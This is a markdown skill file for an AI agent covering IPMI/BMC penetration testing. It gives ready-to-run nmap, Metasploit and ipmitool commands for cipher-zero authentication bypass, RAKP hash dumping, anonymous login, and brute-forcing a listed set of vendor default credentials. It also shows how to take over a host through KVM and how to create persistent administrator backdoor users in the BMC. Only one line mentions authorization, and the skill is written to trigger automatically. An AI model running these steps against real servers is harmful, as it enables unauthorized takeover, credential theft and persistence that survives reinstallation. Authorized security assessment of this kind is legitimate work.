---
name: ipmi-pentesting
description: IPMI (Intelligent Platform Management Interface) pentesting and exploitation. Use this skill whenever the user needs to discover, enumerate, or exploit IPMI services on port 623/UDP/TCP, test for IPMI vulnerabilities (cipher 0, RAKP, anonymous auth), attempt default credentials, access hosts via BMC/KVM, or create backdoors in BMC from compromised hosts. Trigger for any IPMI-related security assessment, remote management interface testing, or BMC exploitation tasks.
---

# IPMI Pentesting Skill

A comprehensive skill for testing and exploiting Intelligent Platform Management Interface (IPMI) services during security assessments.

## What is IPMI?

IPMI (Intelligent Platform Management Interface) is a standardized remote management protocol for computer systems, operating independently of the OS or power state. It allows administrators to:

- Manage systems remotely, even when powered off or unresponsive
- Configure pre-OS boot settings
- Monitor hardware (temperatures, voltages, fan speeds, power supplies)
- Review hardware logs and send SNMP alerts
- Access KVM (Keyboard, Video, Mouse) and serial-over-LAN

**Default Port**: 623/UDP (sometimes TCP)

## When to Use This Skill

Use this skill when you need to:

- Discover IPMI services on a network
- Enumerate IPMI versions and configurations
- Test for known IPMI vulnerabilities (cipher 0, RAKP, anonymous auth)
- Attempt authentication with default credentials
- Exploit IPMI to access the host OS via BMC
- Create persistent backdoors in BMC from a compromised host
- Research IPMI security during penetration tests

## Workflow Overview

1. **Discovery** - Find IPMI services on the target network
2. **Enumeration** - Identify IPMI version and configuration
3. **Vulnerability Testing** - Check for known exploits
4. **Authentication** - Try default credentials and bypass techniques
5. **Access** - Gain host access via BMC/KVM
6. **Persistence** - Create backdoors if host is compromised

---

## 1. Discovery

Find IPMI services on the target network using the discovery script:

```bash
./scripts/discover_ipmi.sh <target_ip_or_range>
```

Or manually with nmap:

```bash
# UDP scan (most common)
nmap -n -sU -p 623 <target>

# TCP scan (less common but possible)
nmap -n -sT -p 623 <target>

# Network-wide scan
nmap -n -sU -p 623 10.0.0.0/24
```

### Using Metasploit

```bash
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <target>
run
```

---

## 2. Enumeration

Identify the IPMI version and configuration:

```bash
./scripts/enumerate_ipmi.sh <target_ip>
```

Or manually:

```bash
# Nmap script
nmap -sU --script ipmi-version -p 623 <target>

# Metasploit
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <target>
run
```

---

## 3. Vulnerability Testing

### Cipher Type 0 Authentication Bypass

A critical vulnerability in IPMI 2.0 that allows unauthorized access with any password when targeting a valid user. Affects HP, Dell, Supermicro, and other vendors.

**Detection:**

```bash
./scripts/test_vulnerabilities.sh <target_ip> cipher-zero
```

Or manually:

```bash
# Metasploit
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS <target>
run
```

**Exploitation with ipmitool:**

```bash
# List users
ipmitool -I lanplus -C 0 -H <target> -U root -P root user list

# Set password for user ID 2
ipmitool -I lanplus -C 0 -H <target> -U root -P root user set password 2 newpassword
```

### RAKP Authentication Hash Retrieval

Retrieves salted password hashes (MD5/SHA1) for any username:

```bash
./scripts/test_vulnerabilities.sh <target_ip> rakp
```

Or manually:

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
run
```

### Anonymous Authentication

Many BMCs allow null username/password access:

```bash
./scripts/test_auth.sh <target_ip> anonymous
```

Or manually:

```bash
# List users with anonymous auth
ipmitool -I lanplus -H <target> -U '' -P '' user list

# Set password for user ID 2
ipmitool -I lanplus -H <target> -U '' -P '' user set password 2 newpassword
```

### Supermicro-Specific Vulnerabilities

**Clear-text Passwords:**

```bash
cat /nv/PSBlock
cat /nv/PSStore
```

**UPnP SSDP Overflow (UDP 1900):**

```bash
use exploit/multi/upnp/libupnp_ssdp_overflow
set RHOSTS <target>
run
```

---

## 4. Authentication Testing

### Default Credentials

Test common default credentials:

```bash
./scripts/test_auth.sh <target_ip> default-creds
```

**Common Default Credentials:**

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| IBM IMM | root | PASSW0RD |
| Fujitsu | admin | admin |
| Supermicro | ADMIN | ADMIN |
| Oracle/Sun ILOM | root | changeme |
| ASUS iKVM | admin | admin |
| HP iLO | (randomized) | (8-char factory string) |

### Brute Force

Use the authentication script with a wordlist:

```bash
./scripts/test_auth.sh <target_ip> brute-force <wordlist_path>
```

---

## 5. Accessing Host via BMC

Once you have BMC access, you can access the host OS through:

### KVM (Keyboard, Video, Mouse)

- Reboot host to root shell via GRUB (`init=/bin/sh`)
- Boot from virtual CD-ROM (rescue disk)
- Manipulate host disk directly (backdoors, data extraction)

### Serial-over-LAN (SOL)

If the physical/serial console is logged in:

```bash
ipmitool -I lanplus -H <target> -U <user> -P <pass> sol activate
```

---

## 6. Creating Backdoors from Compromised Host

If you've compromised a host with BMC, create a persistent backdoor:

```bash
./scripts/create_backdoor.sh <username> <password>
```

Or manually:

```bash
# List existing users
ipmitool user list

# Create backdoor user (ID 4)
ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4  # ADMINISTRATOR privilege

# Verify
ipmitool user list
```

This works on Linux, Windows, BSD, and DOS with `ipmitool` installed and BMC driver support enabled.

---

## 7. Shodan Reconnaissance

Find exposed IPMI services:

```
port:623
```

---

## Scripts Reference

| Script | Purpose |
|--------|--------|
| `discover_ipmi.sh` | Network discovery of IPMI services |
| `enumerate_ipmi.sh` | Version and configuration enumeration |
| `test_vulnerabilities.sh` | Test for cipher 0, RAKP, and other vulnerabilities |
| `test_auth.sh` | Test default credentials, anonymous auth, brute force |
| `create_backdoor.sh` | Create persistent backdoor user in BMC |

---

## Important Notes

- **Rebooting Required**: Many BMC access methods require host reboot, which may be unacceptable in production
- **Privilege Levels**: IPMI users have privilege levels (0-4), with 4 being ADMINISTRATOR
- **Local Access**: From a compromised host, BMC access often requires no authentication
- **Persistence**: Backdoors in BMC survive OS reinstallation and disk replacement
- **Legal**: Only test systems you have explicit authorization to assess

---

## References

- [Rapid7: A Penetration Tester's Guide to IPMI](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
- [Dan Farmer: IPMI Cipher Zero Vulnerability](http://fish2.com/ipmi/cipherzero.html)
- [Rapid7: UPnP Security Flaws](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play)
- [Thomas Krenn: IPMI Basics](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)
